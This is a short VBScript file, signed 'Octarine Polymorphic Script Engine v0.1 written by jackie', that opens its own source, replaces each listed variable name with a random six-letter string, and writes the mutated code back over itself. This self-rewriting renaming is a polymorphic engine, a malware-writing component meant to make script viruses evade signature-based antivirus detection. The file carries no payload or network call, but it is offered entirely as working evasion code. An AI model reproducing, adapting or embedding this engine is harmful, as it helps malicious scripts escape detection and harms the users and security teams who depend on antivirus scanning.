Randomize
Set FSObject = CreateObject("Scripting.FileSystemObject")
Set ScriptFile = FSObject.OpenTextFile(WScript.ScriptFullName, 1)
OurCode = ScriptFile.Readall
AllVariables = "FSObject ScriptFile OurCode AllVariables VarLoop CurVar NewVar VarPos "
Do
CurVar = Left(AllVariables, InStr(AllVariables, Chr(32)) - 1)
AllVariables = Mid(AllVariables, InStr(AllVariables, Chr(32)) + 1)
NewVar = Chr((Int(Rnd * 22) + 65)) & Chr((Int(Rnd * 22) + 65)) & Chr((Int(Rnd * 22) + 65)) & Chr((Int(Rnd * 22) + 65)) & Chr((Int(Rnd * 22) + 65)) & Chr((Int(Rnd * 22) + 65))
Do
VarPos = InStr(VarPos + 1, OurCode, CurVar)
If VarPos Then OurCode = Mid(OurCode, 1, (VarPos - 1)) & NewVar & Mid(OurCode, (VarPos + Len(CurVar)))
Loop While VarPos
Loop While AllVariables <> ""
Set ScriptFile = FSObject.OpenTextFile(WScript.ScriptFullName, 2, True) '
ScriptFile.Writeline OurCode

'Octarine Polymorphic Script Engine v0.1 written by jackie